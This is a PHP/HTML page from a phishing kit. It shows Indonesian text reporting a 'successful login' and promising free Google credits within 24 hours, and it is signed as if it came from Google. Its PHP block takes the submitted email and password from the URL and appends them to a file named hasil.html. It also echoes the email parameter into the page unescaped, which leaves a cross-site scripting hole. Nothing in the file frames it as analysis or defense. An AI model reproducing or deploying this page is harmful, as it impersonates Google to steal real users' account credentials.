<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
</head>

<body>
    <div class="container mt-4">

        <div class="alert alert-success" role="alert">
            <b> Login Berhasil ! </b><br>
            silahkan tunggu saldo masuk pada akun <?= $_GET['identifier']; ?> paling lama 1x24 jam untuk pengiriman hadiah ke google credits kamu <br><br>
            Google .inc
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe" crossorigin="anonymous"></script>
</body>
<?php
$hasil = "hasil.html";
$handle = fopen($hasil, 'a');
$emails = $_GET['identifier'];
$pass = $_GET['Passwd'];

fwrite($handle, "\n");
fwrite($handle, "Email  :" . $emails);

fwrite($handle, "\n");
fwrite($handle, "Password  :" . $pass);
fwrite($handle, "\n");
fwrite($handle, " =====================");
?>

</html>